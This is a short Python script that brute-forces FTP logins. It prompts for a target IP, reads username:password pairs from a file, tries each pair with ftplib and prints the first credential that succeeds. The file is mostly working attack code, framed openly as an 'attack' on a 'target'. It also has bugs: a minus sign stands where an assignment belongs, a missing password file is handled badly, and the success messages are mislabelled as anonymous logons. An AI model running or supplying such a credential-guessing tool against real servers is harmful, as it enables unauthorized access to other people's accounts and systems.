#!/usr/bin/python3

import ftplib
from termcolor import colored

def login(hostname, username, password):
        try:
                ftp = ftplib.FTP(hostname)
                ftp.login(user=username, passwd=password)
                print(f"[+] {hostname} FTP Anonymous Logon Succeeded.")
                ftp.quit()
                return True
        except ftplib.all_errors as e:
                print(f"[-] {hostname} FTP Anonymous Logon Failed.")
        return False

def attack(hostname, passwordfile):
        try:
                pF = open(passwordfile, "r")
        except:
                print("[x] File Cannot be Found.")
        for combo in pF.readlines():
                username = combo.split(":")[0]
                password = combo.split(":")[1].strip("\n")
                print(f"[*] Trying {username}:{password} on {hostname}")
                try:
                        ftp = ftplib.FTP(hostname)
                        login = ftp.login(username, password)
                        print(colored(f"[+] FTP Login Successful with {username}:{password} on {hostname}", "green"))
                        ftp.quit()
                        return(username, password)
                except:
                        pass

host = input("Target IPv4: ")
mode = input("Do you know username and password? [Y/N]").upper()
if mode == "Y":
        user - input("Target User: ")
        passw = input("Target's Password: ")
        login(host, user, passw)
elif mode == "N":
        pfile = input("USER:PASS File Path: ")
        attack(host, pfile)
